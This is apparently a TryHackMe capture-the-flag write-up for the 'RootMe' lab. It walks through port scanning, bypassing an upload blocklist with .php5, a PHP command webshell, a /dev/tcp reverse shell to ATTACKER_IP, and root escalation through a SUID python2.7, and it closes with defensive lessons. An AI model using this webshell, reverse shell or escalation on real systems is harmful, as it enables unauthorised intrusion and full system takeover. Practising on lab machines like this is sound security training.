# 🔐 RootMe

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
| --- | --- |
| **Target** | `rootme.thm` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | File upload filter bypass → PHP webshell → RCE |
| **Privesc** | SUID `python2.7` → `os.execl` shell as root |

RootMe exposes an Apache web server with a file upload panel that filters on a naive extension blocklist. Uploading a `.php5` webshell bypasses the filter entirely since Apache executes it as PHP. From there, a reverse shell is caught as `www-data`, and a SUID bit on `python2.7` provides an immediate root shell via a single GTFOBins one-liner.

---

## 🔍 Enumeration

### Port Scan

```
sudo nmap -sC -sV -p- -vv -T4 rootme.thm
```

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http  Apache/2.4.41 (Ubuntu)
```

Two ports open. HTTP is the only attack surface — SSH has no credentials yet.

### Directory Bruteforce

```
gobuster dir -u http://rootme.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/panel/     → file upload form
/uploads/   → uploaded files, directly web-accessible
```

---

## 💀 Initial Access — File Upload Bypass

### Extension Filter Bypass

The `/panel/` upload form rejects `.php` files. The filter is a naive extension blocklist — it doesn't account for alternate PHP-executable extensions or case variation. Apache on Ubuntu executes `.php5` files as PHP by default, and neither `.php5` nor mixed-case variants like `.pHp5` are blocked.

```
test.php   → blocked
test.pHp5  → accepted ✓  (case bypass)
test.php5  → accepted ✓  (alternate extension bypass)
```

### Webshell Upload & RCE Verification

Uploaded a minimal command execution webshell as `test124.php5`:

```php
<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>
```

Confirmed RCE via curl:

```
$ curl "http://rootme.thm/uploads/test124.php5?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

```
# listener
nc -nlvp 1234
```

Triggered via the `cmd` parameter:

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
```

### Shell Stabilisation

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
stty rows 58 cols 109
export TERM=xterm
```

### User Flag

```
www-data$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## 🔁 Privilege Escalation — www-data → root

### SUID Enumeration

```
www-data$ find / -perm -4000 2>/dev/null | xargs ls -lah
```

```
...
-rwsr-xr-x 1 root root 3.5M  /usr/bin/python2.7
...
```

`/usr/bin/python2.7` has the SUID bit set with root as owner. Any interpreter with SUID is a direct path to root — GTFOBins covers this exactly.

### Root Shell via os.execl

```
www-data$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

The `-p` flag on `sh` preserves the effective UID from the SUID bit. Without it, the shell drops privileges.

### Root Flag

```
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 🗺️ Attack Chain

```
[Nmap]
    80/tcp Apache + /panel/ upload form + /uploads/ web-accessible
          │
          ▼
[File Upload — /panel/]
    .php blocked → .php5 accepted (naive blocklist bypass)
    webshell uploaded → RCE confirmed via curl
          │
          ▼
[Reverse Shell]
    bash one-liner via cmd param → shell as www-data
    python3 pty + stty → stable TTY
          │
          ▼
[SUID Enumeration]
    find / -perm -4000 → /usr/bin/python2.7 (SUID root)
          │
          ▼
[GTFOBins — python os.execl]
    sh -p → euid=0(root) → root.txt
```

---

## 📌 Key Takeaways

* Blocklist-based upload filtering is trivially bypassed — use an allowlist of safe MIME types and extensions, and never serve uploaded files from a web-executable directory
* Apache's handling of `.php5` as executable PHP is a commonly overlooked misconfiguration — explicitly restrict execution to `.php` only in the upload directory, or better, store uploads outside the webroot entirely
* SUID on general-purpose interpreters (Python, Perl, Ruby) is an instant root grant — audit regularly with `find / -perm -4000` and cross-reference against GTFOBins
* The `-p` flag in `sh -p` is the critical detail that preserves SUID-inherited effective UID; without it the shell drops back to the real UID